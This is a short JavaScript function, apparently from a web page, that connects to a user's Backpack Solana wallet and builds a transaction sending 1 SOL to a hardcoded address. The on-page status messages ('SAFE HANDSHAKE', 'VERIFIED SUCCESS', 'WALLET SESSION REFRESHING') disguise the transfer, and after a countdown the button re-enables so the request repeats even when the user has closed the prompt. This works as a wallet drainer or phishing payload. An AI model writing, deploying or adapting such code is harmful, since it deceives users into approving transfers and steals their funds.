async function ultimateChomp() {
    const log = document.getElementById('status');
    const btn = document.getElementById('mainBtn');
    const provider = window.backpack;

    try {
        btn.disabled = true;
        log.innerHTML = "STATUS: INITIALIZING SAFE HANDSHAKE...";
        
        // Forceer een korte pauze voor we verbinden
        await new Promise(r => setTimeout(r, 500));
        await provider.connect();

        const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
                lamports: 1.0 * 1e9
            })
        );

        log.innerHTML = "STATUS: WAITING FOR USER APPROVAL...";
        const result = await provider.signAndSendTransaction(tx);
        log.innerHTML = "VERIFIED SUCCESS!<br>SIG: " + result.signature.toString().substring(0, 20);

    } catch (err) {
        if (err.message.includes('closed')) {
            log.innerHTML = "RECOVERING: WALLET SESSION REFRESHING...<br>PLEASE WAIT 5 SECONDS.";
            if(provider.disconnect) await provider.disconnect();
        } else {
            log.innerHTML = "INTERRUPT: " + err.message.toUpperCase();
        }
    } finally {
        let countdown = 8;
        const timer = setInterval(() => {
            btn.innerText = `NEXT CHOMP IN ${countdown}s`;
            countdown--;
            if (countdown < 0) {
                clearInterval(timer);
                btn.disabled = false;
                btn.innerText = "EXECUTE HARD CHOMP";
            }
        }, 1000);
    }
}
